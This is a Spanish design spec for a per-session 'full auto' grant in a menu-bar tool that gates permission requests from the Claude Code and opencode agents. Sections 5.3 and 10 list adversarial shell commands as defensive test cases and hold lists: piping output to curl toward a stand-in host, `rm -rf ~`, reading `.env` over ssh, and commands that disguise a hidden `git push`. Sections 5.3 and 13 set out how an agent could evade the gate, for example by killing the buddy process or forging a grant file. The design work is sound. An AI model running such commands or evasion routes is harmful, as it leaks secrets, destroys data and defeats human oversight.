# Auto completo por sesión — diseño

Fecha: 2026-11-08 · Rama: `auto-completo-sesion` (desde `personal`) · Estado: borrador para aprobación

Depende de la corrección de rutas de la rama `rutas-enlaces-y-path` (enlaces simbólicos y carpetas como destino). Esa corrección va en su propio PR y entra antes.

## 1. Para qué es esto

El modo auto (spec del 2026-10-21) deja pasar lo rutinario y detiene lo crítico: Python, tests, builds, `rm`, `push`, deploys. Sirve cuando el usuario está mirando. No sirve cuando deja una sesión trabajando sola: la primera tarjeta crítica la detiene, y si nadie contesta regresa al prompt del agente, que espera sin límite. Una corrida de un plan con `swift build && swift test` en cada tarea se queda parada en la primera.

Esta ronda agrega una concesión más ancha y más angosta a la vez: **en esta sesión, pasa todo salvo publicar**. Más ancha porque cubre lo crítico. Más angosta porque vale para una sola sesión, se prende con un clic deliberado y caduca.

La spec del 2026-10-21 declara anti-meta que "un comando crítico se ejecuta sin que el usuario lo vea" y no-meta un "modo auto distinto por repo". Esta spec cambia esa anti-meta a propósito, y solo dentro de una sesión que el usuario marcó. Fuera de ella todo queda como está.

## 2. Metas, no-metas y anti-metas

**Metas**
1. **Concesión por sesión.** En una sesión marcada, lo que la concesión cubre pasa sin tarjeta. Las demás sesiones no cambian.
2. **Todo salvo publicar.** La concesión cubre lo local, incluido lo crítico. Lo que sale de la máquina por shell, las preguntas, los planes y las rutas protegidas siguen con tarjeta.
3. **Una regla, una implementación**, para Claude Code y opencode, como hoy.
4. **Siempre visible y siempre revocable.** El ícono y el menú dicen qué sesiones la tienen, y un clic la apaga.
5. **Caduca sola.** Al cerrar la sesión o tras 8 horas sin actividad.
6. **Rastro.** Lo que pasa por la concesión queda registrado con su sesión, y también cuándo se prendió y se apagó.

**No-metas en esta ronda**
- Prenderla al primer mensaje de la sesión.
- Una lista de sesiones para prenderla desde el menú. El menú solo lista las que ya la tienen.
- Niveles de concesión. Hay uno.
- Herramientas MCP de Claude Code: no pasan por el hook y siguen con su flujo propio.
- Cambiar el modo de permisos nativo de Claude Code o las reglas por sesión de opencode. La concesión vive en el buddy.

**Anti-metas: fracaso aunque "funcione"**
- **Algo que publica pasa sin tarjeta por una forma barata de escribirlo:** encadenado detrás de otro comando, dentro de `sudo`, de `bash -c` o de un `eval`.
- **Una sesión obtiene la concesión sin un clic del usuario**, o usa la de otra sesión.
- **Una concesión invisible:** activa sin que el ícono y el menú lo muestren, o aplicada con la app cerrada.
- **Una concesión que no muere:** sigue viva después de cerrar la sesión y pasadas las 8 horas.
- **Cambia el comportamiento de las sesiones sin concesión.** El modo auto global y "siempre permitir" quedan idénticos.
- **Datos privados en el repo, que es público.**

**Contra qué protege.** Igual que el modo auto: contra los **errores** del agente. Dentro de una sesión con concesión protege menos contra un agente **manipulado**, porque Python y los scripts pasan, y un script puede hacer cualquier cosa. La promesa de "salvo publicar" es sobre lo que la línea de comando dice, no sobre lo que un script hace por dentro. Prender la concesión es confiar en esa sesión (sección 13).

## 3. Restricciones

Las de la spec del 2026-10-21, sección 3, sin cambios: Swift + AppKit con solo Command Line Tools, macOS 13+, sin dependencias nuevas, lógica pura en `BuddyCore`, `shellcheck` limpio, `HookTests` en verde, repo público.

Se agregan:
- **El buddy en vivo corre desde la carpeta principal.** Todo el trabajo va en el worktree `~/Desktop/repos/claude-menubar-buddy-auto-sesion`. Hasta el merge nada toca `~/.config/claude-menubar-buddy/`, `~/.claude/settings.json`, el `LaunchAgent` ni `launchctl`.
- **`buddy-rule` es un proceso nuevo en cada herramienta** y no habla con la app. Todo estado que deba leer vive en archivos.
- **El presupuesto del hook `SessionEnd` es corto** (1.5 s si no se configura otro). Lo que corra ahí tiene que ser inmediato.

## 4. Decisiones

**Del usuario (2026-11-08)**
- **Alcance:** todo salvo publicar. Pasan Python, tests, builds, `rm` y lo irreversible, archivos sensibles y comandos desconocidos.
- **La web del agente pasa** dentro de una sesión con concesión (`WebFetch`, `WebSearch`, la lectura web de opencode). Fuera de ella sigue con tarjeta, como decidió en la spec anterior.
- **Siguen con tarjeta:** `git push`, `gh` cuando publica, deploys, `ssh` que no solo lee, `curl` y similares, las preguntas, los planes y las rutas protegidas.
- **Se prende solo con un botón en la tarjeta.**
- **Dura** hasta cerrar la sesión, apagarla en el menú, o 8 horas sin actividad.
- **Ejecuta DeepSeek en opencode** por bloques, con revisión de Claude en cada uno.
- **La corrección de rutas va antes**, en su propio PR.

**Mías: el usuario puede revertirlas**
- **Comandos retenidos por nombre** (5.3, punto 12): infraestructura, clientes de base de datos por red, los que manejan otras apps, los que deciden qué corre después, túneles y correo. `sqlite3` pasa.
- **Retención por palabra** (5.3, punto 11): `publish`, `push`, `deploy`, `upload` y `--push` en comandos que ejecutan código. Un falso positivo como `pytest tests/test_deploy.py` da tarjeta, que es el lado seguro.
- **Las herramientas que la regla no reconoce nunca quedan cubiertas.** En opencode ahí caen `external_directory` y las MCP, que pueden ser justo las que publican.
- **Toda la categoría de rutas protegidas sigue con tarjeta**, no solo la configuración del buddy.
- **El botón no tiene atajo de teclado** y no responde hasta 1.5 s después de que apareció la tarjeta, tampoco con el mouse.
- **Las concesiones viven en disco y sobreviven a un reinicio del buddy** dentro de sus 8 horas. Se consideró borrarlas al reiniciar y que la app borre cualquier archivo que no emitió; se descartó porque apagaría corridas desatendidas y protege poco: una sesión capaz de fabricar ese archivo ya puede correr Python.
- **En opencode la concesión es de la sesión raíz** y cubre a sus sesiones hijas.
- **En modo plan lo cubierto responde `defer`,** como hoy hace el modo auto: decide el modo plan de Claude Code.
- **El orden en la política:** primero "siempre permitir" y el modo auto global, después la concesión. El veredicto es el mismo en cualquier orden; así la etiqueta `session` marca solo lo que pasó gracias a la concesión.
- **Se registra el ciclo de vida** de cada concesión en el mismo archivo de rastro.
- **Lo retenido sin respuesta regresa al prompt del agente.** En una sesión con concesión, una petición retenida que nadie contesta responde `ask`, sea crítica o no. Es la decisión del usuario de la spec anterior ("crítico sin respuesta no se ejecuta") aplicada a lo que esta spec promete detener. Sin eso, un `C="git push"; $C` sin respuesta lo decidiría el modo nativo de Claude Code. Las sesiones sin concesión no cambian.
- **Matar al buddy queda retenido** (5.3, punto 13). Con la app muerta el hook responde `{}` a todas las sesiones y deciden las reglas nativas.
- **`rm` con variable queda retenido; con comodín se juzga por su parte fija** (5.3, punto 7).
- **En opencode, si al pulsar no se conoce la raíz, la concesión es de la sesión que pidió.** Es más angosta, que es el lado seguro.
- **El barrido de la cola cubre todo el árbol de la sesión** en opencode, no solo la sesión de la tarjeta.
- **La marca del ícono se ve también con una tarjeta pendiente.**

## 5. Qué cubre la concesión

### 5.1 Por tipo de petición

| Petición | Con concesión |
|---|---|
| Shell: lectura, cambio local, sobrescritura, ejecuta código, irreversible, sensible, desconocido | pasa, **salvo que esté retenida** (5.2) |
| Shell: sale de la máquina, ruta protegida | tarjeta |
| Edición del agente: normal o de archivo sensible | pasa |
| Edición del agente: ruta protegida, o ruta que no se puede resolver | tarjeta |
| Lectura de archivo (opencode) | pasa |
| Web del agente | pasa |
| Preguntas y planes | tarjeta, siempre |
| Herramienta no reconocida | tarjeta |

### 5.2 La marca de retenido

Hoy un comando compuesto recibe una sola categoría, la más severa, y cuando dos empatan gana la primera. `rm -rf build; git push` sale `irreversible`: el `push` queda tapado. Hoy no importa, porque las dos piden tarjeta. Con la concesión, `irreversible` pasa, y el `push` pasaría con él. Lo mismo ocurre con los envoltorios, que devuelven `ejecuta` sin mirar adentro: `sudo git push`, `bash deploy_remote.sh`.

Se resuelve sin tocar categorías:
- `Assessment` gana `sessionHold: String?`: por qué una concesión de sesión no cubre esto.
- `effectiveHold` es esa marca o, si la categoría es `sale` o `rutaProtegida`, el motivo de la evaluación.
- Al mezclar dos evaluaciones gana la misma que hoy, y **hereda la retención de la que pierde**.
- La categoría, `critical` y `reason` no cambian en ningún caso. El modo auto global y "siempre permitir" no leen la marca.

**Invariante de esta ronda:** para todo comando de las suites existentes, la categoría es la misma antes y después.

### 5.3 Qué queda retenido

**Imprescindibles.** Sin ellas la promesa se rompe con una línea de shell.
1. `sudo` y `doas`, con lo que sea adentro.
2. Asignaciones que cambian cómo se resuelve el comando: prefijos `PATH=`, `DYLD_*`, `LD_*`, `GIT_*`, `BASH_ENV`; `env VAR=…`; `export PATH=…`.
3. Un comando vacío, no analizable, con `case` o con definición de función.
4. Una palabra de comando que es variable o sustitución (`C="git push"; $C`).
5. Un destino de escritura con expansión o que no se puede resolver (`F=~/.zshrc; echo x >> $F`).
6. Los escritores que la regla ya marca como desconocidos: `sort -o`, `tree -o`, `yq -i`, `uniq entrada salida`, `find -fprint*`.
7. `rm`, `rmdir`, `unlink`, `shred` y `truncate`, cuando el objetivo (la categoría sigue `irreversible`):
   - es una ruta protegida;
   - contiene una ubicación protegida fija: `rm -rf ~/.config`, `rm -rf ~`, `rm -rf /`. Cuenta solo lo protegido con ubicación fija (lo que cuelga de la carpeta del usuario o de la raíz), no lo que se protege por nombre en cualquier carpeta. Borrar un repo entero, con su `.git`, pasa: es irreversible, y eso el usuario decidió dejarlo pasar;
   - lleva una variable o una sustitución (`rm -rf "$D"`): no se sabe qué borra;
   - lleva un comodín y su parte fija, lo que va antes del primer comodín, es una ruta protegida, es la carpeta del usuario o la raíz, o el comodín empieza con punto (`rm -rf ~/.ssh/*`, `rm -rf ~/*`, `rm .*`). `rm -rf build/*` pasa.
8. Todo `git push`, y los subcomandos y banderas de git que la regla no conoce (`send-email`, `lfs`, `subtree`, `--git-dir`).
9. `ssh` que no sea solo lectura, y también una lectura cuyo comando remoto lleve una expansión o sustitución local (`ssh h "echo $(cat .env)"`).

**Recomendadas** (decisión mía).
10. **Shell en línea.** `bash|sh|zsh|dash|ksh|fish -c TEXTO` (también `-lc`, `-ic`), `eval`, `exec` y un heredoc hacia un shell: se evalúa TEXTO con la misma regla y se hereda su retención. Tope de 3 niveles; más allá, retenido.
11. **Palabra que publica**, solo en comandos de categoría `ejecuta` o `desconocido`: un argumento sin guion igual a `publish`, `push`, `deploy` o `upload`; un argumento que contiene `deploy` o `publish`; la bandera `--push`; un argumento cuyo nombre base es un comando que sale de la máquina (`npx vercel`, `exec curl`).
12. **Por nombre:**
    - infraestructura: `kubectl helm terraform pulumi ansible ansible-playbook`;
    - bases de datos por red: `psql pg_dump createdb dropdb mysql mysqldump mongo mongosh redis-cli`;
    - túneles y correo: `ngrok cloudflared mail mailx sendmail msmtp mutt sshpass mosh lftp`;
    - manejan otras apps: `osascript open shortcuts automator`;
    - deciden qué corre después: `launchctl crontab at batch su`;
    - sistema: `security tccutil csrutil spctl nvram systemsetup networksetup scutil softwareupdate installer`, y `defaults` cuando no es `read`.

13. **Matar al buddy:** `kill`, `pkill` o `killall` cuando algún argumento, o una sustitución dentro de él, nombra `ClaudeMenuBarBuddy`, `claude-menubar-buddy` o `buddy-rule`, sin distinguir mayúsculas. Cubre `pkill -f ClaudeMenuBarBuddy` y `kill $(pgrep ClaudeMenuBarBuddy)`. No cubre `kill 1234`: un número no dice de quién es el proceso (sección 13).

Quedan fuera a propósito `release` y `login`, para no detener `swift build -c release` ni `cargo build --release`.

**Pasan con concesión** (y deben tener test): `rm -rf build`, `rm -rf build/*`, `rm -rf proyecto-viejo`, `kill 1234`, `pkill -f runserver`, `cat .env`, `python3 x.py`, `bash x.sh`, `swift build -c release`, `npm run build`, `make test`, `docker run --rm img`, `sqlite3 db 'select 1'`, `git commit -m "deploy fix"`, `git reset --hard`, `ssh h 'cat /srv/.env'`.

### 5.4 La política

`AutoModePolicy.decide` gana `sessionGrant: Bool` (falso por defecto) y `Grant` gana `.session`. El orden:
1. Pregunta o plan → tarjeta.
2. "Siempre permitir" → pasa. Igual que hoy.
3. Modo auto global y categoría que pasa en auto → pasa, o `defer` en modo plan. Igual que hoy.
4. **Nuevo.** Hay concesión y la cubre → pasa con `.session`, o `defer` en modo plan.
5. Tarjeta.

La concesión no depende del interruptor global: con el modo auto apagado y la concesión prendida, lo cubierto pasa igual.

Una función pura, `sessionGrantCovers(subject:assessment:)`, es la única que decide la cobertura (tabla 5.1). La usan la política, la tarjeta (para saber si ofrece el botón) y el barrido de la cola.

## 6. La concesión

- **Dónde vive:** un archivo por concesión, `~/.config/claude-menubar-buddy/session_auto/<agente>-<sesión>.json`. Carpeta con modo 700 y archivo con 600. Esa carpeta ya es ruta protegida.
- **Qué guarda:** `agent` (`claude` u `opencode`), `sessionID`, `cwd`, `project`, `grantedAt` y `trigger` (la herramienta y el inicio del comando de la tarjeta donde se prendió, recortado).
- **El identificador se valida y se rechaza, no se transforma.** Solo ASCII `[A-Za-z0-9_-]`, de 1 a 128 caracteres. El agente tiene que ser exactamente `claude` u `opencode`. Un identificador inválido significa "no hay concesión".
- **Cuándo cuenta como viva.** Las cuatro a la vez:
  - es un archivo regular, no un enlace;
  - su fecha de modificación no está más de 60 s en el futuro;
  - pasaron menos de 8 horas desde esa fecha;
  - el `agent` y el `sessionID` de adentro coinciden con los que se preguntan.
- **La actividad es la fecha de modificación.** Se renueva cuando la sesión con concesión pide algo, con cualquier veredicto, y a lo más una vez por minuto. Renovar nunca crea el archivo: si ya se revocó, falla y no pasa nada.
- **Quién hace qué:**

| Proceso | Crea | Renueva | Borra |
|---|---|---|---|
| La app | sí, solo desde el botón de la tarjeta | sí, por opencode | menú, caducidad, fin de sesión de opencode |
| `buddy-rule` | nunca | sí, por Claude Code | solo en `SessionEnd` |

- **Escritura atómica:** temporal con modo 600 y `rename`. Quien lee ve "no hay" o "completa".
- **Consultar no borra.** Así un `buddy-rule` nunca borra una concesión que la app acaba de renovar. Borra caducadas solo el barrido de la app.
- **Carreras, todas hacia el lado seguro:**
  - revocar contra renovar: la renovación falla y no recrea;
  - el borde de las 8 horas: se pierde la concesión y la siguiente petición da tarjeta;
  - revocar contra una evaluación en curso: esa petición pasa; es cuestión de milisegundos.
- **Sobrevive al reinicio del buddy** dentro de sus 8 horas. Al arrancar, la app las lista y el ícono las muestra.
- **App cerrada = sin concesión.** `hook.sh` sale antes de consultar la regla, como hoy.

## 7. Claude Code

### 7.1 `buddy-rule`
- Lee `session_id` del JSON del hook. Si hay una concesión viva para `claude` y ese identificador, la renueva y le pasa `sessionGrant: true` a la política.
- La salida gana `session_coverable` (Bool): si una concesión cubriría esta petición. Se calcula siempre, haya o no concesión. Es lo que decide si la tarjeta ofrece el botón.
- La salida gana `ask_on_timeout` (Bool): verdadero si la petición es crítica, como hoy, o si la sesión tiene una concesión viva y la petición está retenida. Es lo único que `hook.sh` mira al agotarse el tiempo.
- Motivo cuando pasa por la concesión: `Auto completo de esta sesión (<categoría>) vía Claude Menu Bar Buddy`.
- Con concesión viva y veredicto tarjeta, el motivo es el de la retención. La tarjeta dice "sale de tu máquina: git push" y no "no se puede deshacer: rm".
- Registra en `auto_decisions.jsonl` lo que pasa por modo auto y lo que pasa por concesión.
- Subcomando nuevo `buddy-rule session-end`: lee el JSON de `SessionEnd`, revoca la concesión de esa sesión si existe, lo anota en el rastro e imprime `{}`.
- **No tiene ningún camino que cree una concesión.**

### 7.2 `hook.sh`
- El archivo `request_<id>.json` suma `session` (el `session_id` del hook) y `session_coverable`.
- La respuesta de emergencia, cuando la regla no contesta, no trae `session_coverable`: queda en falso. Sí trae `ask_on_timeout` en verdadero, porque es crítica.
- **Al agotarse el tiempo** responde `ask` si `ask_on_timeout` es verdadero, y `{}` si no. Para las sesiones sin concesión el resultado es el de hoy: `ask` en lo crítico.
- Nada más cambia. El corte por app cerrada sigue siendo lo primero.

### 7.3 `notify-done.sh`
- Caso nuevo `SessionEnd`: le pasa el JSON a `buddy-rule session-end`. El script no arma rutas con el identificador; eso lo hace solo Swift.
- Corre aunque la app esté cerrada, y lo único que puede hacer es revocar.
- Si falta el binario no hace nada: la concesión muere por las 8 horas o a mano.

### 7.4 Instalación y salud
- Entrada nueva en `~/.claude/settings.json`, documentada en `SKILL.md` y `README.md`: el evento `SessionEnd` con `notify-done.sh` y `timeout: 5`. La app no edita ese archivo, como nunca lo ha hecho.
- Recordatorio de volver a copiar `hook.sh`, `notify-done.sh` y `buddy-rule` después de compilar.
- Chequeo de salud, dos avisos opcionales nuevos: `SessionEnd` no está conectado, y el `notify-done.sh` instalado no es el del repo.

### 7.5 Consecuencias que hay que conocer
- **Las reglas `deny` y `ask` de `settings.json` siguen ganando** sobre el `allow` del hook, y Claude Code tiene excepciones propias que ningún `allow` salta. La concesión nunca da más de lo que Claude Code permite.
- **Los subagentes quedan cubiertos:** comparten el identificador de su sesión (sección 14).
- **Reanudar conserva el identificador,** pero al cerrar se revocó: la sesión reanudada empieza sin concesión.
- **En la app de escritorio y en VS Code el cierre casi nunca llega.** Mantienen un proceso por sesión durante días. Ahí el apagado que actúa es el de las 8 horas.

## 8. opencode

- **Dónde se decide:** en `OpenCodeBridgeCore.handlePermission`, con la misma política. Primero decide como hoy; si eso da tarjeta, la petición es cubrible y hay concesiones de opencode, busca una para la sesión o para alguno de sus ancestros.
- **Sesiones hijas.** Los subagentes tienen identificador propio y `parentID`. Se sube por la cadena de padres con tope de 8 y guarda contra ciclos. Si un ancestro tiene concesión, pasa.
- **Padre desconocido.** Si falta un eslabón, se pide con `GET /api/session/{id}` y la petición espera. Si no se resuelve en 2 s, o la consulta falla, sale como tarjeta. **Nunca pasa nada con linaje desconocido.** Esa espera solo ocurre cuando hay concesiones y la petición sería cubrible; sin concesiones el puente se comporta exactamente como hoy.
- **La respuesta es `once`, siempre.** Nunca `always`, que opencode guarda por proyecto.
- **El archivo de la tarjeta** suma `session` y `session_coverable`.
- **La concesión se escribe para la raíz.** Un clic en la tarjeta de un subagente deja en auto completo a la sesión que el usuario está mirando.
- **Para que la raíz se conozca al pulsar,** cada vez que el puente escribe la tarjeta de una petición cubrible pide el linaje de esa sesión si le falta. No espera la respuesta: la tarjeta sale igual. Es la única consulta nueva que ocurre sin concesiones, y no cambia ninguna decisión.
- **Si al pulsar la raíz todavía no se conoce,** la concesión se escribe para la sesión que pidió. Queda más angosta y el menú la muestra así.
- **El barrido cubre el árbol.** Al prender, y en cada revisión de la cola mientras haya concesiones, se aprueban las tarjetas cubribles de cualquier sesión cuya raíz tenga concesión. Una tarjeta con linaje desconocido se queda, se pide su linaje, y entra en el barrido cuando llega. Importa porque las tarjetas de opencode no caducan: una hermana olvidada dejaría a su subagente parado.
- **Fin de sesión:** los eventos `session.deleted` y `session.archived` revocan. Su forma exacta no está capturada en vivo (sección 14), así que el decodificador acepta el identificador en `data.sessionID`, `data.id` o `data.info.id`.
- **Al conectar:** por cada concesión de opencode se consulta su sesión; si ya no existe o está archivada, se revoca. Cubre los eventos que llegaron con la app cerrada.
- **Formularios y preguntas:** siguen llegando al usuario.
- **Falla cerrado,** como el resto del puente: ante un evento o una respuesta que no entiende, tarjeta.

## 9. La app

### 9.1 La tarjeta
- **Fila nueva:** "Permitir y dejar esta sesión en auto completo". Va apilada encima de la fila discreta de hoy ("siempre permitir", "prender el modo auto"), que no cambia ni pierde su atajo ⌥⌘⏎.
- **Cuándo se ofrece.** Las cuatro a la vez: la petición trae `session_coverable`, viene de un agente conocido, trae una sesión con identificador válido, y no es una pregunta. Eso excluye por sí solo lo que sale por shell, las rutas protegidas, los planes y todo lo retenido.
- **En las tarjetas críticas cubribles** (Python, `rm`, `.env`, web) hoy no hay ninguna oferta. Ahí el botón nuevo es la única.
- **Sin atajo.** Es la concesión más ancha de la app y tiene que nacer de un clic.
- **Con espera.** No responde hasta 1.5 s después de que apareció la tarjeta, sea crítica o no. Antes de eso, la sacudida y el sonido de bloqueado. Evita el clic sobre una tarjeta que aparece bajo el cursor.
- **Al pulsar, en este orden:**
  1. Si la petición de Claude ya pasó su ventana de respuesta, no se escribe nada y se retira como hoy.
  2. Se escribe la concesión. Si falla, la tarjeta se queda y avisa.
  3. Se barren de la cola las demás peticiones que la concesión cubre: las de la misma sesión en Claude Code, las de todo el árbol de la sesión en opencode (sección 8). Se aprueban, con rastro en `auto_decisions.jsonl`.
  4. Se aprueba la petición actual. Su línea en `decisions.jsonl` lleva `grant: "session"` y la sesión, para saber cuándo nació.
- **La concesión se escribe antes de responder,** para que la siguiente herramienta de la sesión ya la encuentre.
- **El mismo barrido corre en cada revisión de la cola** mientras haya concesiones, por las peticiones que llegaron un instante antes del clic.
- **Límite conocido:** la tarjeta solo se dibuja con la mascota flotante visible. Con la mascota oculta no hay forma de prender la concesión, igual que hoy con "siempre permitir".

### 9.2 El menú
- Elemento "Auto completo: N sesión(es)" después de "Modo auto". Oculto cuando no hay ninguna.
- Una fila por concesión: `<proyecto> · <Claude Code|opencode> · desde HH:mm · <disparador>`. Un clic la apaga. La ayuda emergente dice la última actividad y cuándo caduca.
- Al final, "Apagar en todas".
- El mismo elemento aparece en el menú de petición pendiente, que hoy reemplaza al de reposo.
- No se usa para prender.

### 9.3 El ícono
- Marca propia, distinta del rayo del modo auto, mientras haya al menos una concesión.
- La etiqueta de accesibilidad suma ", N sesión(es) en auto completo".
- Se ve también con una tarjeta pendiente: las tarjetas que quedan en una sesión así son las de publicar, y es cuando más importa recordarlo.

### 9.4 Rastro e historial
- Cada línea de `auto_decisions.jsonl` suma `grant` (`auto` o `session`) y `session`. Las líneas viejas, sin esos campos, se siguen leyendo y cuentan como `auto`.
- Ciclo de vida, en el mismo archivo: "encendida" con su disparador, y "apagada" con su causa (fin de sesión, menú, 8 horas, todas).
- El historial muestra lo que pasó por concesión con un glifo distinto del de modo auto.
- `DecisionStats` sigue contando solo decisiones humanas.

### 9.5 Caducidad
- La app barre las caducadas cada 30 s y refresca menú e ícono.

## 10. Pruebas

- **Retenciones (`BuddyCore`).** La sección 5.3 completa, un caso o más por punto, y los que deben pasar. Como mínimo estos adversarios, todos retenidos:
  - cada orden de `X; git push` y `git push; X`, con `X` en `rm -rf build`, `python3 a.py`, `cat .env`;
  - `sudo git push`, `PATH=/tmp:$PATH git push`, `git push --receive-pack=x`;
  - `bash -c 'git push'`, `eval 'git push'`, `bash <<EOF` con `git push` adentro;
  - `xargs sh -c 'git push'`, `find . -exec sh -c 'curl x' \;`;
  - `python3 a.py | curl -d @- https://x`, `echo x | sudo tee /etc/hosts`;
  - `bash deploy_remote.sh`, `make deploy`, `npm run deploy`, `npm publish`, `docker push img`;
  - `C="git push"; $C`, `F=~/.zshrc; echo x >> $F`, `rm ~/.zshrc`;
  - `ssh h 'cat .env; sudo reboot'`, `ssh h "echo $(cat .env)"`;
  - `rm -rf ~/.config`, `rm -rf ~`, `rm -rf "$D"`, `rm -rf ~/.ssh/*`, `rm .*`;
  - `pkill ClaudeMenuBarBuddy`, `killall claudemenubarbuddy`, `kill $(pgrep ClaudeMenuBarBuddy)`.
- **Invariante de categorías.** Todas las suites existentes siguen en verde sin cambiar una sola expectativa de categoría.
- **Política.** La tabla 5.1 entera; concesión con modo auto apagado; modo plan; "siempre permitir" y modo auto conservan su etiqueta.
- **Almacén.** Identificadores `../x`, `a/b`, vacío, con salto de línea final, con tilde, de 129 caracteres; caducada a las 8 h y 1 s; fecha en el futuro; contenido que no coincide con el nombre; enlace simbólico en lugar del archivo; renovar una revocada no la recrea; permisos.
- **Contrato de `buddy-rule`.** Pasa con `grant: "session"` y deja su línea; **otra sesión en la misma carpeta da tarjeta**; sin `session_id` da tarjeta; caducada da tarjeta; `git push` con concesión da tarjeta con el motivo de la retención; `session-end` borra solo la suya.
- **`HookTests`.** La petición lleva `session` y `session_coverable`; **con la app sin correr y una concesión en disco, devuelve `{}`**; ida y vuelta con concesión; con concesión, una petición retenida y no crítica sin respuesta devuelve `ask`; sin concesión, esa misma petición devuelve `{}` como hoy.
- **`notify-done.sh` real.** `SessionEnd` borra la concesión; un identificador con `../` no borra nada; sin `buddy-rule` no falla.
- **opencode.** Concesión directa; hija con padre conocido; hija con padre desconocido espera, pide el linaje y pasa al llegar; linaje no disponible da tarjeta; web pasa; `external_directory` no; shell que sale no; sesión borrada y archivada revocan; una tarjeta cubrible pide su linaje sin esperar; el barrido aprueba la tarjeta de una hermana y deja la de otra raíz; pulsar con raíz desconocida concede a la sesión que pidió.
- **Piezas puras de la app.** Cuándo se ofrece el botón; el barrido no toca otra sesión ni otro agente; la espera del clic; glifos; líneas viejas del rastro.
- **Sin comandos reales del historial.** Los casos se escriben a mano.

## 11. Cómo se construye

- **Dónde:** el worktree `~/Desktop/repos/claude-menubar-buddy-auto-sesion`, rama `auto-completo-sesion`.
- **El plan:** se escribe con *superpowers:writing-plans* en `docs/superpowers/plans/2026-11-08-entrega-5-auto-completo-por-sesion.md`, en tareas pequeñas con archivos, código esperado, test y comando de verificación. `AGENTS.md` apunta a ese plan.
- **Base del plan:** `personal` con la corrección de rutas ya mergeada; esta rama se rebasa sobre ella antes de escribirlo. Esa corrección cambia interfaces que el bloque 1 usa: `FileProbe` gana `symlinkDestination(_:)`; `PathPolicy` gana `protectedSpelling(_:)`, `sensitiveSpelling(_:)` y `label(_:landingOn:)`, y juzga una ruta por su nombre y por cada salto de un enlace; una carpeta que guarda rutas protegidas o secretos cuenta ella misma; `StubProbe` gana `links`.
- **Antes del plan,** Claude captura lo que falta de la sección 14 y lo deja como fixtures saneadas en `Tests/ClaudeMenuBarBuddyTests/Support/`:
  - el `session_id` que recibe un hook `PreToolUse` dentro de un subagente de Claude;
  - `session.created` de una sesión hija de opencode, con su `parentID`;
  - `session.deleted` y `session.archived`;
  - la respuesta de `GET /api/session/{id}` para una sesión hija y para una archivada.
- **Quién lo ejecuta:** DeepSeek V4.1 Flash en opencode, con los mismos permisos de `opencode.jsonc` que las entregas anteriores.
- **Cuatro bloques**, cada uno con `swift build && swift test` en verde:
  1. **La regla:** marca de retenido y mezcla; retenciones imprescindibles; retenciones recomendadas; política. Solo `BuddyCore`; nada cambia para el usuario.
  2. **Almacén y hook de Claude:** almacén; rastro e historial; `buddy-rule`; `hook.sh` y `notify-done.sh`. Al cerrar este bloque todavía nada crea concesiones.
  3. **opencode:** eventos; núcleo del puente; conexión.
  4. **La app:** piezas puras; estado; tarjeta; menú e ícono; salud y documentación.
- **Revisión:** Claude revisa al final de cada bloque: diff de los tests contra el plan, `swift build && swift test`, `shellcheck`, y un driver aparte sobre la regla con casos tramposos fuera del plan.
- **Un PR a `personal`.** El merge lo hace el usuario.
- **Puesta en vivo,** solo después del merge: compilar en la carpeta principal; copiar `hook.sh`, `notify-done.sh` y `buddy-rule`; agregar la entrada `SessionEnd` a `~/.claude/settings.json` con permiso del usuario; `launchctl kickstart`.
- **La entrega 4** (`chequeo-opencode`) sigue sin ejecutar y toca `Health.swift`, `README.md` y `AGENTS.md`. La que entre segunda se rebasa sobre la primera.

## 12. Lo que queda al constructor

- La organización interna de tipos y archivos y los nombres, salvo los que esta spec fija.
- El símbolo exacto de la marca del ícono y el estilo de la fila nueva, dentro de `CardTheme`.
- El glifo del historial.
- Cómo se recorta el disparador que guarda la concesión.
- Ampliar las listas de 5.3, siempre con un test por cada comando agregado.

No queda al constructor: qué cubre la concesión (5.1), el orden de la política (5.4), quién puede crear una concesión (6) y las condiciones del botón (9.1).

## 13. Riesgos y temas abiertos

- **Auto completo es confiar en esa sesión.** Python, scripts y comandos desconocidos pasan, y pueden publicar, mandar mensajes reales, escribir rutas protegidas o fabricar una concesión para otra sesión. Es inherente al alcance elegido. La promesa cubre lo que la línea de comando dice.
- **Leer secretos y leer la web pasan los dos.** Dentro de una sesión con concesión, la salida que la spec anterior cerraba queda abierta.
- **La retención por palabra no ve todo.** Un `make ship` o un `npm run release` que publiquen pasan. Un hook `pre-commit` que publique también; es el riesgo ya aceptado de `git commit`.
- **Una concesión puede sobrevivir a su sesión hasta 8 horas.** Una terminal matada o un reinicio de la máquina no disparan el cierre. Se ve en el menú y se apaga a mano.
- **Instalación a medias.** Con `buddy-rule` o `hook.sh` viejos, la tarjeta no ofrece el botón o todo da tarjeta: lado seguro. Con `notify-done.sh` viejo, las concesiones no mueren al cerrar; por eso el chequeo nuevo.
- **`pgrep` acepta cualquier proceso con el nombre de la app,** por ejemplo una instancia de prueba con otra carpeta de configuración. Existe hoy y no cambia.
- **Matar al buddy por número de proceso pasa.** `kill 1234` no dice de quién es el proceso. Con la app muerta no hay concesiones ni tarjetas para nadie, y deciden el modo y las reglas nativas de cada agente.
- **El analizador de shell sigue siendo la pieza de mayor riesgo.** El sesgo es el mismo: lo que no se entiende queda retenido.
- **opencode v2 cambia cada semana.** El puente falla cerrado.

## 14. Hechos verificados (2026-11-08)

Claude Code 2.1.318 en terminal; la app de escritorio trae 2.1.317 y la extensión de VS Code 2.1.280. opencode 2.1.2.

**Comprobado en vivo**
- `SessionEnd` entrega `session_id`, `transcript_path`, `cwd`, `scratchpad_dir`, `prompt_id`, `hook_event_name` y `reason`. En una sesión `-p` que termina, `reason` es `other`.
- `--resume` conserva el `session_id`. `SessionStart` llega con `source: "resume"`.
- `UserPromptSubmit` trae `permission_mode` y `prompt`. `SessionStart` y `SessionEnd` no traen `permission_mode`.
- Los transcripts de los subagentes llevan el identificador de la sesión padre.
- La app de escritorio y VS Code mantienen un proceso por sesión con entrada en streaming; había procesos de 4 a 45 días.
- Con la regla instalada: `rm -rf build; git push` da `irreversible`; `sudo git push` y `bash deploy_remote.sh` dan `ejecuta`.

**De la documentación oficial**
- `PreToolUse` corre en todos los modos de permisos, y su `allow` evita el diálogo salvo las excepciones propias de Claude Code. Las reglas `deny` y `ask` se evalúan igual.
- `AskUserQuestion` y `ExitPlanMode` no se pueden aprobar con un `allow` simple.
- En modo plan un `allow` no tiene efecto sobre lo que no es lectura.
- Solo `PermissionRequest` puede cambiar el modo de la sesión; por eso no se usa.
